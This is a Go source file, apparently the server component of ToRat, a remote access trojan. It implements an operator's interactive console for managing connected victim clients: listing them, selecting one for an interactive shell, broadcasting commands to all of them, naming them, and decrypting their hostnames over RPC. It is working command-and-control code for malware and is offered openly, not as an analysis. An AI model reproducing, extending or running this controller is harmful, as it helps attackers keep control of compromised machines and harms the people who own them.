package server

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/shared"
	"github.com/lu4p/ToRat/torat_server/crypto"
)

var void int

// Shell server side interactive shell menu
func Shell() {
	fileCompleter := func([]string) []string {
		files, err := filepath.Glob("*")
		if err != nil {
			return nil
		}
		return files
	}

	shell := ishell.New()
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(green("[Server] ") + red("[!]", err))
		panic(err)
	}
	shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

	commands := []*ishell.Cmd{
		{
			// Select client
			Name: "select",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients to select!"))
					return
				}
				choice := c.MultiChoice(listConn(), "Select client to interact with:")
				client := getClient(choice)
				client.shellClient()
			},
			Help: "interact with a client",
		},
		{
			// Select client
			Name: "broadcast",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients connected!"))
					return
				}
				fmt.Println("Clients that will accept your commands")
				fmt.Println(green(listConn()))

				broadcast := broadcast{cwd}
				broadcast.BroadcastShell()
			},
			Help: "go to the broadcast shell",
		},
		{
			// List clients
			Name: "list",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
					return
				}
				printClients()
			},
			Help: "list all connected clients",
		},
		{
			// Set client alias
			Name: "alias",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
					return
				}
				choice := c.MultiChoice(listConn(), "Select client to give an alias:")
				fmt.Println(green("Type an alias for selected client:"))
				name := c.ReadLine()
				client := activeClients[choice]

				client.Data().Name = name
				saveData()
			},
			Help: "give a client an alias",
		},
		{
			// Change directory
			Name: "cd",
			Func: func(c *ishell.Context) {
				path := strings.Join(c.Args, " ")
				err := os.Chdir(path)
				if err != nil {
					fmt.Println(green("[Server] ") + red("[!] Cannot navigate to that path!"))
					fmt.Println(green("[Server] ") + red("[!]", err))
				}
				cwd, _ := os.Getwd()
				shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")
			},
			Help:      "change the working directory of the server",
			Completer: fileCompleter,
		},
		{
			// Exit the server
			Name: "exit",
			Func: func(c *ishell.Context) {
				fmt.Println(green("[Server] ") + red("Exiting Now!"))
				c.Stop()
			},
			Help: "exit the server",
		},
	}

	for _, c := range commands {
		shell.AddCmd(c)
	}

	shell.NotFound(runCommand)
	shell.Run()
}

// Server side shell command
func runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")

	out, err := shared.RunCmd(command, false)
	if err != nil {
		c.Println(green("[Server]"), red("[!] Bad or unknown command:", err))
		return
	} else if out == nil {
		c.Println(green("[Server]"), "No output returned by command!")
		return
	}
	c.Println(string(out))
}

// getHostname of a client
func (ac *activeClient) getHostname() error {
	var encHostname shared.EncAsym

	if err := ac.RPC.Call("API.Hostname", void, &encHostname); err != nil {
		return err
	}

	byteHostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		// try to regenerate the hostname if it can't be decrypted
		if err := ac.RPC.Call("API.NewHostname", void, &encHostname); err != nil {
			return err
		}

		byteHostname, err = crypto.DecAsym(encHostname)
		if err != nil {
			return err
		}
	}

	ac.Hostname = string(byteHostname)
	return nil
}
